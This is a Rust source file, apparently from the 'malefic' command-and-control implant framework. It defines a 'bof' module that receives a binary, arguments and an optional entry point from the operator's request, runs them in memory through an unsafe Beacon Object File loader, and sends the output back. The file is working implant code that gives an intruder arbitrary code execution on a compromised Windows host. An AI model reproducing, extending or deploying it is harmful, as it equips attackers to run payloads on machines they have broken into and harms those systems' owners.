use crate::{check_request, Module, Result, TaskResult};
use async_trait::async_trait;
use malefic_helper::protobuf::implantpb::spite::Body;
use malefic_helper::protobuf::implantpb::AssemblyResponse;
use malefic_helper::win::kit::bof::bof_loader;
use malefic_trait::module_impl;
use prost::Message;
use std::ffi::CString;
use std::ptr::null;

pub struct ExecuteBof {}

#[async_trait]
#[module_impl("bof")]
impl Module for ExecuteBof {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        sender: &mut crate::Output,
    ) -> Result {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let bin = &request.bin;
        let args = &request.args;
        let ep: Option<String>;
        if request.entry_point.is_empty() {
            ep = None
        } else {
            ep = Some(request.entry_point)
        }
        let result: Vec<u8>;
        unsafe {
            let ret = bof_loader(bin, args, ep);
            result = ret.encode_to_vec();
        }

        Ok(TaskResult::new_with_body(
            id,
            Body::AssemblyResponse(AssemblyResponse {
                status: 0,
                data: result,
                err: "".to_string(),
            }),
        ))
    }
}
